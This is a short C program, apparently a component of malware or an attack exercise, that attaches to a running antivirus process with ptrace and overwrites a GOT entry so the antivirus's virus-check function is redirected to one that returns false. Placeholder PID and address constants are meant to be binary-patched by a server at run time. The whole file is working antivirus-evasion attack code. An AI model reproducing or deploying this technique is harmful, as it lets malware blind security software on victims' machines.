#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


// unusual value to overide with run time pid of the antivirus
const int UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678;
// unusual value to memory address of the check_if_value
// to overide with the run time address
const int GOT_MEMORY_ADDRESS_FOR_BIN_PATCH = 0x56565656;
// unusual value to memory address of the check_if_live_patch
// to overide with the run time address
const int MEMORY_ADDRESS_FOR_ALTERNATIVE_FUNCTION = 0x10283746;

// global variables for the binary patching of this compiled file
// by the server when getting the run time pid of the antivirus
int pid = UNUSUAL_PID_VALUE_FOR_BIN_PATCH;
int got_addr = GOT_MEMORY_ADDRESS_FOR_BIN_PATCH;
int alternative_func_addr = MEMORY_ADDRESS_FOR_ALTERNATIVE_FUNCTION;

int main() {
    // attach to the process
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("attach");
        return 1;
    }

    // wait for the process to stop
    int status;
    waitpid(pid, &status, 0);
    // abort if the process exits
    if(WIFEXITED(status)) { return 1; }

    // patching the is_file_virus function to return false
    // on each file

    if(ptrace(PTRACE_POKETEXT, pid, got_addr, alternative_func_addr) == -1) {
        perror("overriding got entry of function check_if_virus with memory address of function check_if_live_patch to return false on the malware");
        return 1;
    }

    // detach from the process
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        perror("detach");
        return 1;
    }


    return 0;
}
